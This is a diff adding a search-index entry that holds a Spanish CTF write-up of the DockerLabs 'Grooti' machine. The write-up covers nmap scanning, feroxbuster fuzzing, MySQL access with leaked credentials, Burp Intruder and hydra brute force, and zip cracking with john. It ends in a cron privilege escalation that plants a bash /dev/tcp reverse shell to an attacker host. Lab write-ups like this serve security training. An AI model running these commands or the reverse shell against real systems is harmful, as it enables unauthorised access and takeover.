@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Grooti, DockerLabs",
+    "url": "/posts/grooti/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, nmap, feroxbuster, hydra, burpsuite, john, revshell",
+    "date": "2025-08-14 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing ficheros y dirs      feroxbuster...",
+    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing ficheros y dirs      feroxbuster              fuerza bruta      hydra              mysql      basico navegaciony seleccion              Crak zip      john      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pkgpoison 172.17.0.3reporteComo vemos tenemos el 80 http, el 22 ssh y el 3306 mysql, sin mas demora revisamos la web y lanzamos un feroxbuster para ver que directorios y ficheros hay.Para empezar en la web ya encontramos varias cositas entre ellas grooti que podria ser nombre de usuario.Despues tenemos un menu con tres links en los cuales tambien encontramos en mis fotos un txt con el contenido curioso.Como vemos dice que es un passwordY por ultimo viendo el fuento de la web principal encontramos un comentario que podria ser otro usuario rocket.En la web facturas no encutro nada.Miremos que encontro feroxferoxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt -t 40 -u http://172.17.0.3Nos encuentra un directorio secret asi que a seguir mirando web.Vemos otro posible user naia , no encuentro nada mas asi que voy a hacerle caso y porbar si rocket entra en mysql que no se dnd lo lei y pruebo con rocket y la pass del readme.mysql -h 172.17.0.3 -u rocket -p #accedemos sin problemasshow databases;use files_secret;show tables;select * from rutas;Hemos conseguido una nueva ruta unprivate/secret asi que vamos a ella.Despues de ver que hace cada vez que pruebas se genera un txt que se descraga curioso , pero voy a burpsuite para hacerle brute force.Para ello realizo lo siguiente.Como sabemos que solo es de 0 a 100 lo neceistamos como lista asi que ejecuto seqseq 1 100  configuramos el proxy en el navegador  lanzamos burp y activamos el proxy  realizamos la peticion para que sea capturaDA burpsuite  enviamos la peticion al intruder  configuramos el ataque  lanzamos el ataque  analizamos los resultadosCuando tengamos bastantes testeados podemos empezar a buscar diferencias y el payload correcto es 16.Exacto al acertar el numero te descarga un fichero zip password16.zip , huele a jon.Crack zip:  Lo hasheamos con zip2jon  Lanzamos el ataque de diccionario contra el fichero hasheado.  Descomprimimos y seguimos con el retozip2john password16.zip &gt; hashjohn hash  --pot=salida --wordlist=~/Descargas/rockyou.txtPerfecto una vez descomprimido podemos observar que es un listado de contraseñas y solo nos queda atacar el ssh recordamos que tenemos varios posibles usarios pero yo voy a tirar con grooti primero asi que hydra adelante.hydra -l grooti -P password16.txt 172.17.0.3 sshTenemos suerteTenemos acceso y grooti es el unico usario asi que de el a root.EscaladaCon un pequeño script para realizar comprobaciones basicas ‘pronto en mi github’ encontre que hay tareas en crontab que parecen prometedoras.Lo revisamos y nos lleva a otro fichero en tmp. Observando ambos y sus permisos vemos que hay algo para el grupo asi que vamos a tratar de editar /tmp/malicius, no me voy a complicar le voy a agregar una revshell./bin/bash -i &gt;&amp; /dev/tcp/192.168.0.104/8899 0&gt;&amp;1Somos root , la verdad esta muy divertida esta maquina te hace ir de un lugar a otro tiene users para despistar , bonito puzzle gracias.  Ponganse a la escucha antes  aunque como es con cron tardara mas o menos saludosMuchas gracias poor leerme, espero que te haya gustado y que te sirva de ayuda."
+  },
+  
+  {
     "title": "Pingctf, DockerLabs",
     "url": "/posts/pingctf/",
     "categories": "DockerLabs",
